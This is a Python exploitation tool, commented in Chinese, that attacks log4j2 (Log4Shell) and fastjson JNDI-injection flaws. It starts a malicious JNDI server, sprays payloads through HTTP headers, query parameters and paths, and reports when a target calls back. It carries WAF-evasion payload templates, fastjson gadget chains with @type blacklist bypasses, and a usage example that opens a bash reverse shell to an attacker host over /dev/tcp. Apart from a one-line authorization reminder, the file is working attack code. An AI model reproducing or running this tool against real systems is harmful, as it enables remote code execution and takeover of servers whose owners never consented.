#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Java 反序列化 / JNDI 注入利用 —— fastjson 与 log4j2 两类漏洞的探测与利用。

为什么有这个工具
----------------
工具箱原本注册了 fastjson、log4j 两条，但指向的 jar 是第三方专属命名、无公开
下载源，所以那两条一直是空壳；文档里写着「功能由 jndi 覆盖」，可实际上只是
启动了 JNDI 服务，**没有任何东西负责把载荷送进目标**。

本工具补的就是这一段：把 `${jndi:...}` 送进 log4j2 会记录的地方、把 fastjson
的 `@type` 链送进 JSON 解析点，并管理 JNDI 服务、判定目标是否真的回连。

链路（已在本地用真实靶机验证）
    我们 ──载荷──▶ 目标应用 ──JNDI 查找──▶ 我们的 JNDI 服务 ──恶意类──▶ 目标

用法
----
  # 一条命令跑通：起 JNDI 服务 + 打目标 + 报告是否命中
  javadeser --mode log4j -u http://target/ --serve --lhost 10.0.0.5 \\
            --cmd 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'

  # 复用已经起好的 JNDI 服务（URL 原样填服务端打印的那个，别自己加路径）
  javadeser --mode log4j -u http://target/ --jndi ldap://10.0.0.5:1389/abcd12
  javadeser --mode fastjson -u http://target/api --jndi ldap://10.0.0.5:1389/abcd12

  # 只看会发出什么（不真的打）
  javadeser --mode log4j --jndi ldap://x/y --show
  javadeser --mode fastjson --jndi ldap://x/y --show

授权提醒：仅可用于你拥有明确授权的目标。
"""
import argparse
import json
import os
import re
import signal
import subprocess
import sys
import threading
import time

try:
    import requests
except ImportError:
    sys.stderr.write("[错误] 缺少 requests。装它：tools/_venv/bin/pip install requests\n")
    sys.exit(1)

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = os.path.dirname(os.path.dirname(HERE))
JNDI_JAR = os.path.join(BASE, "tools", "jndi",
                        "JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


# --------------------------------------------------------------------------
# log4j2 载荷
# --------------------------------------------------------------------------
# 语法：${jndi:<协议>://<主机>:<端口>/<路径>}
# 注意路径必须与服务端注册的完全一致——多一个字符也会变成
# 「Reference that matches the name(...) is not found」。
LOG4J_TEMPLATES = {
    "plain":       "${jndi:%s}",
    "lower":       "${${lower:j}ndi:%s}",              # 绕过对 "jndi" 字面量的匹配
    "upper":       "${${upper:j}ndi:%s}",
    "::-":         "${${::-j}${::-n}${::-d}${::-i}:%s}",
    "env":         "${${env:BARFOO:-j}ndi:%s}",         # 利用环境变量展开
    "lower+date":  "${${lower:${lower:jndi}}:%s}",
    "split":       "${j${lower:n}di:%s}",
    "unicode":     "${j\\u006edi:%s}",                  # unicode 转义
}

# log4j2 会记录哪些位置——这些是实际踩过的注入点
LOG4J_HEADERS = [
    "User-Agent", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "X-Originating-IP",
    "X-Api-Version", "X-Druid-Comment", "Origin", "Referer", "Cookie", "Accept",
    "Accept-Language", "Authorization", "X-Auth-Token", "Contact", "X-Forwarded-Host",
]


def build_log4j_payload(jndi_url, template="plain"):
    tpl = LOG4J_TEMPLATES.get(template)
    if tpl is None:
        raise KeyError(f"未知模板 {template!r}，可用: {'、'.join(LOG4J_TEMPLATES)}")
    return tpl % jndi_url


# --------------------------------------------------------------------------
# fastjson 载荷
# --------------------------------------------------------------------------
# 1.2.24 起点的经典链。注意不同版本被拦的点不同，所以按 gadget 分成几档，
# 让使用者可以逐个试而不是只有一个选择。
FASTJSON_PAYLOADS = {
    "jdbc-rowset":      lambda u: json.dumps({
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": u, "autoCommit": True}),
    "jdbc-rowset-2":    lambda u: json.dumps({
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": u, "autoCommit": True, "schema": "a"},
        separators=(",", ":")),
    "jndi-in-array":    lambda u: json.dumps([{
        "@type": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": u, "autoCommit": True}]),
    "bcel":             lambda u: json.dumps({
        "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
        "driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},
        "driverClassName": u}),
    "jndi-field":       lambda u: json.dumps({
        "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}),
    "mbean":            lambda u: json.dumps({
        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_bytecodes": [u], "_name": "a", "_tfactory": {}, "_outputProperties": {}}),
}
# 常见的绕过"@type 黑名单"的写法
FASTJSON_EVASIONS = {
    "none":      lambda p: p,
    "spaces":    lambda p: p.replace('"@type"', '"@type "'),
    "lowercase": lambda p: p.replace('"@type"', '"@TYPE"'),
    "unicode":   lambda p: p.replace('"@type"', '"\\u0040type"'),
    "bracket":   lambda p: p.replace("{", "{/*", 1),
}


# --------------------------------------------------------------------------
# JNDI 服务
# --------------------------------------------------------------------------
class JndiServer:
    """托管工具箱自带的 JNDI-Injection-Exploit。

    它启动后会在 stdout 打印一组可用 URL（rmi/ldap × 若干 JDK 环境），
    命中目标时打印 `Send LDAP reference result for ...` 之类的行——
    这些行就是「目标确实发起了查找」的判据。
    """

    #: 命中判据。第三类 "is not found" 也说明目标连过来了，只是路径没对上，
    #: 这恰恰是最常见的误用（自己给服务端给的 URL 后面加了路径）。
    HIT_RE = re.compile(
        r"Send LDAP reference result|Sending local classloading reference"
        r"|Reference that matches the name")
    URL_RE = re.compile(r"(rmi|ldap)://[\w.\-]+:\d+/[\w\-]+")

    def __init__(self, cmd="open /Applications/Calculator.app", lhost="127.0.0.1",
                 timeout=60):
        self.cmd = cmd
        self.lhost = lhost
        self.timeout = timeout
        self.proc = None
        self.lines = []
        self.urls = {}
        # 读线程把 stdout 收进 lines。**不能用 readline() 直接读**——管道里
        # 没数据时它会阻塞，把「发完载荷等几秒再收结果」这一步卡死。
        self._lock = threading.Lock()
        self._reported = 0          # 已经吐给调用方的行数

    def java(self):
        """用工具箱自带的 JDK 8——JNDI 利用需要 Java 8 的类加载行为。"""
        for ver in ("8", "11", "17"):
            p = os.path.join(BASE, "Java_path", f"Java_{ver}_win", "bin",
                             "java" + (".exe" if os.name == "nt" else ""))
            if os.path.exists(p):
                return p
        return "java"

    def start(self, wait=15):
        if not os.path.exists(JNDI_JAR):
            raise FileNotFoundError(
                f"未找到 JNDI 服务 jar: {JNDI_JAR}\n"
                f"      跑 `python3 scripts/provision_tools.py --tools jndi` 安装")
        # start_new_session：让 JNDI 服务自成一个进程组。否则它与本 CLI 同组，
        # 收尾时 os.killpg(getpgid(child)) 会把**我们自己**一起 SIGTERM 掉
        # （表现为工作做完了、退出码却是 143）。
        kwargs = {} if os.name == "nt" else {"start_new_session": True}
        self.proc = subprocess.Popen(
            [self.java(), "-jar", JNDI_JAR, "-C", self.cmd, "-A", self.lhost],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            encoding="utf-8", errors="replace", bufsize=1, **kwargs)
        threading.Thread(target=self._reader, daemon=True).start()

        deadline = time.time() + wait
        while time.time() < deadline:
            with self._lock:
                lines = list(self.lines)
            for line in lines:
                # 用 finditer 而不是 findall：这个正则只有一个捕获组，
                # findall 返回的是字符串列表，按二元组解包会报
                # "too many values to unpack"。
                for m in self.URL_RE.finditer(line):
                    self.urls.setdefault(m.group(1), m.group(0))
            if self.urls and any("LDAPSERVER" in l and "Listening" in l
                                 for l in lines):
                return self.urls
            if self.proc.poll() is not None:
                raise RuntimeError(self._explain_exit(lines))
            time.sleep(0.2)
        if not self.urls:
            raise RuntimeError("JNDI 服务没打印出可用 URL：" +
                               "\n".join(self.lines[-8:]))
        return self.urls

    def _explain_exit(self, lines):
        """把 java 的堆栈翻译成用户能处置的说明。直接甩堆栈没用。"""
        blob = "\n".join(lines)
        if "Address already in use" in blob or "BindException" in blob:
            busy = [l for l in lines if "bind" in l.lower()]
            return ("JNDI 服务起不来：**端口被占用**（1099/1389/8180 之一）。\n"
                    "      多半是上一次的 JNDI 服务还没退干净。先清掉：\n"
                    "        pkill -f 'JNDI-Injection-Exploit.*jar'\n"
                    "      或改端口重试：--lport <另一个端口>")
        return "JNDI 服务启动即退出：\n" + blob[-600:]

    def _reader(self):
        for line in self.proc.stdout:
            with self._lock:
                self.lines.append(line.rstrip("\n"))

    def poll_hits(self):
        """取回上次调用之后新出现的命中行（非阻塞）。"""
        if not self.proc:
            return []
        with self._lock:
            new = self.lines[self._reported:]
            self._reported = len(self.lines)
        return [l.strip() for l in new if self.HIT_RE.search(l)]

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                if os.name == "nt":
                    self.proc.terminate()
                else:
                    # 子进程起了自己的会话（见 start），这里 killpg 只影响它
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
            except Exception:
                try:
                    self.proc.terminate()
                except Exception:
                    pass


# --------------------------------------------------------------------------
# 攻击
# --------------------------------------------------------------------------
def send_log4j(url, payload, vectors, timeout=15):
    """把载荷按指定向量打出去。返回 [(向量描述, 状态码或错误)]。"""
    out = []
    for kind, name in vectors:
        headers = {"User-Agent": UA}
        params, data, path = None, None, None
        if kind == "header":
            headers[name] = payload
            desc = f"Header: {name}"
        elif kind == "param":
            params = {name: payload}
            desc = f"Query:  {name}"
        elif kind == "body":
            data = {name: payload}
            desc = f"Body:   {name}"
        else:
            path = "/" + payload
            desc = "Path"
        try:
            r = requests.get(url, headers=headers, params=params, data=data,
                             timeout=timeout)
            out.append((desc, r.status_code))
        except requests.RequestException as e:
            out.append((desc, f"{type(e).__name__}"))
    return out


def send_fastjson(url, payload, timeout=15, post=True):
    headers = {"User-Agent": UA, "Content-Type": "application/json"}
    try:
        if post:
            r = requests.post(url, data=payload.encode("utf-8"),
                              headers=headers, timeout=timeout)
        else:
            r = requests.get(url, headers=headers, timeout=timeout)
        return r.status_code, r.text[:200]
    except requests.RequestException as e:
        return None, f"{type(e).__name__}: {e}"


# --------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(
        description="fastjson / log4j2 的 JNDI 注入探测与利用",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode", choices=["log4j", "fastjson"], default="log4j")
    ap.add_argument("-u", "--url", help="目标 URL")
    ap.add_argument("--jndi", help="JNDI 服务 URL（服务端打印的那个，原样填）")
    ap.add_argument("--serve", action="store_true",
                    help="自己起 JNDI 服务（用工具箱自带的 JNDI-Injection-Exploit）")
    ap.add_argument("--lhost", default="127.0.0.1", help="--serve 时目标回连的地址")
    ap.add_argument("--lport", type=int, default=1389, help="--serve 时的 LDAP 端口")
    ap.add_argument("--cmd", default="open /Applications/Calculator.app",
                    help="--serve 时 JNDI 服务投递的命令")
    ap.add_argument("--template", default="plain",
                    choices=sorted(LOG4J_TEMPLATES),
                    help="log4j 载荷模板（带多个 WAF 绕过变体）")
    ap.add_argument("--all-templates", action="store_true",
                    help="log4j：把所有绕过变体都打一遍")
    ap.add_argument("--vector", action="append", default=None,
                    help="log4j 注入点，可重复。默认打一批常见 Header")
    ap.add_argument("--param", action="append", default=None,
                    help="log4j：额外把这些查询参数作为注入点")
    ap.add_argument("--gadget", default="jdbc-rowset",
                    choices=sorted(FASTJSON_PAYLOADS), help="fastjson 的 gadget 链")
    ap.add_argument("--evasion", default="none", choices=sorted(FASTJSON_EVASIONS),
                    help="fastjson 的 @type 绕过写法")
    ap.add_argument("--show", action="store_true", help="只打印将要发出的载荷，不发送")
    ap.add_argument("--wait", type=float, default=6.0,
                    help="发送后等待多少秒再读 JNDI 服务的命中记录")
    args = ap.parse_args()

    # --- 载荷 -------------------------------------------------------------
    if args.serve:
        jndi = None            # 起了服务之后才知道
    else:
        if not args.jndi:
            ap.error("要么给 --jndi，要么用 --serve 自己起服务")
        jndi = args.jndi

    server = None
    if args.serve:
        server = JndiServer(cmd=args.cmd, lhost=args.lhost)
        print(f"[启动] JNDI 服务（命令: {args.cmd}，回连地址: {args.lhost}）")
        try:
            urls = server.start()
        except Exception as e:
            print(f"[错误] {e}", file=sys.stderr)
            return 1
        for k, v in urls.items():
            print(f"        {k}: {v}")
        jndi = urls.get("ldap") or next(iter(urls.values()))
        print(f"[使用] {jndi}")

    # --- 生成 + 发送 -------------------------------------------------------
    results = []
    try:
        if args.mode == "log4j":
            templates = (sorted(LOG4J_TEMPLATES) if args.all_templates
                         else [args.template])
            vectors = []
            if args.vector:
                for v in args.vector:
                    if v == "path":
                        vectors.append(("path", None))
                    elif ":" in v:
                        k, n = v.split(":", 1)
                        vectors.append((k, n))
                    else:
                        vectors.append(("header", v))
            else:
                vectors = [("header", h) for h in LOG4J_HEADERS]
            for n in (args.param or []):
                vectors.append(("param", n))

            payloads = [(t, build_log4j_payload(jndi, t)) for t in templates]
            if args.show:
                for t, p in payloads:
                    print(f"\n[{t}] {p}")
                print(f"\n注入点（{len(vectors)} 个）:")
                for k, n in vectors:
                    print(f"  {k}: {n}")
                return 0
            if not args.url:
                ap.error("要指定 -u 目标地址")

            for tname, payload in payloads:
                print(f"\n== 模板 {tname} ==\n   {payload}")
                for desc, status in send_log4j(args.url, payload, vectors):
                    results.append((desc, status))
                    print(f"   {desc:32s} -> {status}")

        else:  # fastjson
            raw = FASTJSON_PAYLOADS[args.gadget](jndi)
            payload = FASTJSON_EVASIONS[args.evasion](raw)
            if args.show:
                print(payload)
                return 0
            if not args.url:
                ap.error("要指定 -u 目标地址")
            print(f"== gadget {args.gadget} / evasion {args.evasion} ==\n   {payload}")
            status, body = send_fastjson(args.url, payload)
            print(f"   POST -> {status}   {body!r}")

        # --- 判定 -----------------------------------------------------------
        if server:
            print(f"\n[等待] {args.wait}s 收集 JNDI 服务的回连记录……")
            time.sleep(args.wait)
            hits = server.poll_hits()
            if hits:
                print("\n[命中] 目标确实发起了 JNDI 查找——载荷投递成功：")
                for h in hits:
                    print(f"   {h}")
                print("\n  说明：这证明注入成立。能否进一步 RCE 取决于目标的 JDK 版本")
                print("        与 classpath（8u191+ 的 trustURLCodebase=false 需要")
                print("        目标为 Tomcat/SpringBoot 环境才有对应链）。")
                return 0
            print("\n[未命中] JNDI 服务没收到任何查找。可能原因：")
            print("   - 目标没记录这个注入点（换 --vector 或 --param 试）")
            print("   - 目标不是存在漏洞的版本，或有 WAF 拦了（试 --template lower 等变体）")
            print("   - 目标连不上 JNDI 服务（--lhost 是否为目标可达的地址？）")
            return 2
        return 0
    finally:
        if server:
            server.stop()


if __name__ == "__main__":
    sys.exit(main())
